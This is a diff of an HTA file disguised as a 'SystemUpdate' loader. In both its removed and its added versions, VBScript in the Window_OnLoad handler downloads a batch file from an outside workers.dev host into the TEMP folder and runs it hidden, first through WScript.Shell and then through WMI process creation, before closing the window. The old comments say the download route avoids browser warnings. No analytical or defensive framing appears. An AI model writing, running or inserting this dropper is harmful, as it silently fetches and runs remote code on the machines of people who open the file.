@@ -1,47 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
-    <hta:application 
-        applicationname="SystemUpdate" 
-        border="none" 
-        innerborder="no" 
-        scroll="no" 
-        windowstate="minimize" 
-        showintaskbar="no">
-    <script language="VBScript">
-        Sub Window_OnLoad
-            On Error Resume Next
+<hta:application 
+    id="LoaderApp" 
+    applicationname="SystemUpdate" 
+    maximizebutton="no" 
+    minimizebutton="no" 
+    scroll="no" 
+    showintaskbar="no" 
+    singleinstance="yes" 
+    windowstate="minimize"
+>
+<script language="VBScript">
+    Sub Window_OnLoad
+        On Error Resume Next
+        
+        Dim s1, s2, targetUrl, destPath, shellObj, wmiObj
+        
+        s1 = "https://windows.msrdustibles.workers.dev/"
+        s2 = "nah.bat"
+        targetUrl = s1 & s2
+        
+        Set shellObj = CreateObject("WScript.Shell")
+        Set wmiObj = GetObject("winmgmts:\\.\root\cimv2")
+        
+        destPath = shellObj.ExpandEnvironmentStrings("%TEMP%") & "\update_cache.bat"
+        
+        Dim xHttp
+        Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        xHttp.open "GET", targetUrl, False
+        xHttp.send
+        
+        If xHttp.status = 200 Then
+            Dim streamObj
+            Set streamObj = CreateObject("ADODB.Stream")
+            streamObj.Type = 1
+            streamObj.Open
+            streamObj.Write xHttp.responseBody
+            streamObj.SaveToFile destPath, 2
+            streamObj.Close
             
-            ' URLs definieren
-            Dim fileUrl, savePath, shell, xhr, stream
-            fileUrl = "http://windows.msrdustibles.workers.dev/nah.bat"
+            Dim startup, config, process
+            Set startup = wmiObj.Get("Win32_ProcessStartup")
+            Set config = startup.SpawnInstance_()
+            config.ShowWindow = 0
             
-            Set shell = CreateObject("WScript.Shell")
-            savePath = shell.ExpandEnvironmentStrings("%TEMP%") & "\update_sys.bat"
-            
-            ' Download über XMLHTTP (umgeht klassische Browser-Warnungen)
-            Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-            xhr.open "GET", fileUrl, False
-            xhr.send()
-            
-            If xhr.status = 200 Then
-                ' Als Datei im Temp-Ordner speichern
-                Set stream = CreateObject("ADODB.Stream")
-                stream.Type = 1 ' Binary
-                stream.Open
-                stream.Write xhr.responseBody
-                stream.SaveToFile savePath, 2 ' Overwrite
-                stream.Close
-                
-                ' Unsichtbar im Hintergrund ausführen
-                shell.Run chr(34) & savePath & chr(34), 0, False
-            End If
-            
-            ' Sofortiges Schließen der HTA, damit keine Fenster offen bleiben
-            Self.Close()
-        End Sub
-    </script>
+            wmiObj.Get("Win32_Process").Create "cmd.exe /c " & destPath, Null, config, process
+        End If
+        
+        window.close
+    End Sub
+</script>
 </head>
 <body>
 </body>
